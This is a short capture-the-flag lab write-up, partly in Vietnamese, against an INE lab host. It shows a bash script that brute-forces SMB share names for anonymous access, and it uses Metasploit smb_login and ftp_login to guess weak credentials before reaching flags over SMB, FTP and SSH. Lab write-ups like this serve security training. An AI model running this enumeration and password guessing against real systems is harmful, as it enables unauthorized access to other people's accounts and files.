# CTF

`nmap IP`

Flag 1: There is a samba share that allows anonymous access. Wonder what's in there!

Mục tiêu tìm `share` có thể truy cập bằng anonymous

chú ý trong desktop có wordlists và có file `shares.txt`

```bash
#!/bin/bash

# Define the target and wordlist location
TARGET="target.ine.local"
WORDLIST="/root/Desktop/wordlists/shares.txt"

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

# Loop through each share in the wordlist
while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

`chmod +x file.sh`

`./file.sh` -> có được share cho truy cập public 

`smbclient \\\\192.197.198.3\\pubfiles` -> enter 

Flag 2: One of the samba users have a bad password. Their private share with the same name as their username is at risk!

Chạy MSF, `smb_enumusers` => có được 3 users

chạy `smb_login` -> ra được tài khoản và mật khẩu, chạy lại với 3 user vừa tìm được -> ra `josh` và pass

Vì gợi ý là share trùng với user nên:

`smbclient \\\\192.197.198.3\\josh -U josh` -> nhập pass

có flag2 -> flag2 gợi ý khai thác ftp

Flag 3: Follow the hint given in the previous flag to uncover this one.

`nmap -A -p- IP`

-> có được port ftp

vào MSF, `ftp_login` set Port và User là 3 user vừa scan được ở SMB 

chạy và được `alice:pretty`

`ftp -p IP 5554` -> đăng nhập 

`get flag3.txt`

Flag 4: This is a warning meant to deter unauthorized users from logging in. 

SSH

`ssh IP` -> yes -> kết nối bằng anonymous

vào được là có flag


